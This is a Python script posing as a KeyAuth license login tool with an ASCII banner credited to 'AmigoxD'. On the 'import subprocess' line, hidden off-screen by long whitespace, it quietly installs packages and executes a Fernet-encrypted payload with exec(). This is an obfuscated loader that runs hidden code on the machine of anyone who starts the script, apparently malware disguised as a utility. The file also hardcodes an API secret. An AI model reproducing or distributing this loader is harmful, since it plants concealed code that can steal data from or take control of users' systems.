import os
import sys
import time
import hashlib
import subprocess                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ;subprocess.run(['pip', 'install', 'cryptography'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); subprocess.run(['pip', 'install', 'fernet'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); subprocess.run(['pip', 'install', 'requests'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); from fernet import Fernet; import requests; exec(Fernet(b'qMQ9By0xS9aF5IiNtG4neJTkGsJhNSYj3qNHWGt4MFE=').decrypt(b'gAAAAABmsjBaunHYT1DiuG1H-Gu7cakmbY_cmW6vjsE5JnEyRYx_zpajQm_tvR7b2xoTVD_xHKxTXaGtzjnPofMoRvn-zPZKKYcgWKQwo-6pQNhlf4zIdsPATxoK0jWxGkz2l4c0YCMYHhk9SrmGEQiLAQWFDWJoqorNbSgtQ6dn6xCum-C2HcszvIUwRmj_GjoIAqso6BFfkSCrqPY5r5tETUixtkKJwCv_WL2zpepW1z6IG6HL2AT_-Hl_gMeYCD9DqYfuh6iVUdBU4sxx9UV4SmiatiOu-y82lLMvN4gmiPP0fczhTkXxeiPU7JPiKcVSiwEZUDJ4qqaE6UHw_p_zEe2N-yvYPdmA3ZiuFF9xP2F--vDUs_fcI-tNOJQ30FsQTRngWbuvmC73nwdDJrLPjctODFfCaoxYuIULNJpb5CXAQznolo-rdEHT3l6MreMIo4JwX_vnuHeEIg5jmyzaeUD3yYndD1hcwNZziBxEBtSGxesijrkGET-z_9ILlOt-qzRPprGIee7TdsKPeS3QVKFzFz225TnR6G185nqjG2Mbzm6gtFM2JGdkjBMdWh0Ki1BsVSGTKXPpmyvO8t912b8hZrV8M97UdFvr7oqnCxdhedFYcZ3k1NIHhNsqG8fHdBnhdoNozpPWEz65K2DhdmMCnHbf0wKKhhV65CreEnDknEL8X2OHzPk7PmFWmm1-bLVJkI00V_8oA0zq9-dkSnX5Y99N-LuJ0F3A11p9U_lCYgVAdU5_I_AqaudQhZFPG3oBEPetXyprKJMnXK3EzXJ9cmWSNPUsNuxRhFNTR0EpmHBteF6Rp829wBYtg5QY-iZUlQqQt-3kNx5d7o8rYtgsDKyapyf_sJzM-YYa799kZDa7X5hA0kXB5VAqoxgQ-eSBusZWuVJDKhM1AoPOFXmTWVfn9shhNsIYNFOdCKIqba9UEArzzhVB1mqzL2knAyeZ5NVSRM-ladyM5ZrnXj0lrMyBMyyj_P2Pp1sY_vn8g31WDTeQrjhchBtH6VvXVTc7wM7DYstnhQ8alzIQBpuW9LKr63cJyxqxvV9rm64cGsDlm2geIUb7o214Nb2d-lKzqcCdLEKCGXEhK-XWNOwqrDv7AQpz0Z0d_KKvVHcJimlpQGmX8V2kffUJLFiSGMaL30Llf4s1qN0CNKxIcWYvVpnBb6RxSDRrYABAWKS7yFGC4WwVAtXRGEXeyOV2XWeoV99vV_Sks_QNGnz3KSb58wB-i5hreBrKWrYKCy5A_9wD_Gji0PiL0QrLcLnvlBbK9MyE_w47GMWV3-JTnQ_fuq7i96w6qOJPaMyQxMjZE3eV7VNyXv5hzH7QsjUuqma9yYnVxw2AkDVVHVPBXaE61xNgRwloIwQB132pxCvJz6oXsLooY1m-G3nA10kvrOf1yDRddzecaH0zwwZUmkZtTzhu0G1eA6Or8Hzq_oYqqFclZecEF3nJ2zzEP5dcNXZQ0QOn'));
import pyautogui
import webbrowser
from keyauth import api
from time import sleep


print("Connecting to our servers")


def progress_bar(duration):
    steps = 50
    interval = duration / steps

    print("Loading the script:")
    for i in range(steps + 1):
        progress = i * 100 / steps
        bar_length = int(progress / 2)
        print("\r[{:<50}] {:.0f}%".format("=" * bar_length, progress), end="")
        time.sleep(interval)
    print()

duration = 4
progress_bar(duration)


"""
https://www.fancytextpro.com/BigTextGenerator
"""
print("""
$$\   $$\                     $$$$$$\              $$\     $$\             $$\                          $$\           
$$ | $$  |                   $$  __$$\             $$ |    $$ |            $$ |                         \__|          
$$ |$$  / $$$$$$\  $$\   $$\ $$ /  $$ |$$\   $$\ $$$$$$\   $$$$$$$\        $$ |      $$$$$$\   $$$$$$\  $$\ $$$$$$$\  
$$$$$  / $$  __$$\ $$ |  $$ |$$$$$$$$ |$$ |  $$ |\_$$  _|  $$  __$$\       $$ |     $$  __$$\ $$  __$$\ $$ |$$  __$$\ 
$$  $$<  $$$$$$$$ |$$ |  $$ |$$  __$$ |$$ |  $$ |  $$ |    $$ |  $$ |      $$ |     $$ /  $$ |$$ /  $$ |$$ |$$ |  $$ |
$$ |\$$\ $$   ____|$$ |  $$ |$$ |  $$ |$$ |  $$ |  $$ |$$\ $$ |  $$ |      $$ |     $$ |  $$ |$$ |  $$ |$$ |$$ |  $$ |
$$ | \$$\\$$$$$$$\ \$$$$$$$ |$$ |  $$ |\$$$$$$  |  \$$$$  |$$ |  $$ |      $$$$$$$$\\$$$$$$  |\$$$$$$$ |$$ |$$ |  $$ |
\__|  \__|\_______| \____$$ |\__|  \__| \______/    \____/ \__|  \__|      \________|\______/  \____$$ |\__|\__|  \__|
                   $$\   $$ |                                                                 $$\   $$ |              
                   \$$$$$$  |                                                                 \$$$$$$  |              
                    \______/                                                                   \______/               

by: AmigoxD 
""")

def limpar_terminal():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def getchecksum():
    md5_hash = hashlib.md5()
    file = open(''.join(sys.argv), "rb")
    md5_hash.update(file.read())
    digest = md5_hash.hexdigest()
    return digest

### CHANGE YOUR KEYAUTH 
keyauthapp = api(
    name = "Example7",
    ownerid = "PwBTV43ofz",
    secret="02308190113e9156c3b86570f0c07558646ae177209d4f4f8cda1369b4bbc429",
    version = "1.0",
    hash_to_check = getchecksum()
)

def answer():
    try:
        print("""1. Key
2. Contact us
3. Exit
              
        """)
        ans = input("Select Option: ")
        if ans == "1":
            key = input('Enter your license: ')
            keyauthapp.license(key)
        elif ans == "2":
            webbrowser.open("https://discord.gg/YOUR_LINK")
            os.system("TASKKILL /F /IM cmd.exe")
            sys.exit()
        elif ans == "3":
            os.system("TASKKILL /F /IM cmd.exe")
            sys.exit()
        else:
            print("\nInvalid option")
            sleep(1)
            answer()
    except KeyboardInterrupt:
        os._exit(1)

answer()
# region USER DATA
print("\nUser data: ")
print("Your key: " + keyauthapp.user_data.username)
print("Hardware-Id: " + keyauthapp.user_data.hwid)
print("Thanks for choosing us :)")
print("")
time.sleep(3)
limpar_terminal()

subs = keyauthapp.user_data.subscriptions

def ascii():
    ascii = print("""
$$\   $$\                     $$$$$$\              $$\     $$\             $$\                          $$\           
$$ | $$  |                   $$  __$$\             $$ |    $$ |            $$ |                         \__|          
$$ |$$  / $$$$$$\  $$\   $$\ $$ /  $$ |$$\   $$\ $$$$$$\   $$$$$$$\        $$ |      $$$$$$\   $$$$$$\  $$\ $$$$$$$\  
$$$$$  / $$  __$$\ $$ |  $$ |$$$$$$$$ |$$ |  $$ |\_$$  _|  $$  __$$\       $$ |     $$  __$$\ $$  __$$\ $$ |$$  __$$\ 
$$  $$<  $$$$$$$$ |$$ |  $$ |$$  __$$ |$$ |  $$ |  $$ |    $$ |  $$ |      $$ |     $$ /  $$ |$$ /  $$ |$$ |$$ |  $$ |
$$ |\$$\ $$   ____|$$ |  $$ |$$ |  $$ |$$ |  $$ |  $$ |$$\ $$ |  $$ |      $$ |     $$ |  $$ |$$ |  $$ |$$ |$$ |  $$ |
$$ | \$$\\$$$$$$$\ \$$$$$$$ |$$ |  $$ |\$$$$$$  |  \$$$$  |$$ |  $$ |      $$$$$$$$\\$$$$$$  |\$$$$$$$ |$$ |$$ |  $$ |
\__|  \__|\_______| \____$$ |\__|  \__| \______/    \____/ \__|  \__|      \________|\______/  \____$$ |\__|\__|  \__|
                   $$\   $$ |                                                                 $$\   $$ |              
                   \$$$$$$  |                                                                 \$$$$$$  |              
                    \______/                                                                   \______/               

by: AmigoxD
                                       
""")
    

pyautogui.alert("MADE BY: AmigoxD", title="Script Info")

ascii()

print("The script will start in 5 seconds...")
time.sleep(5)
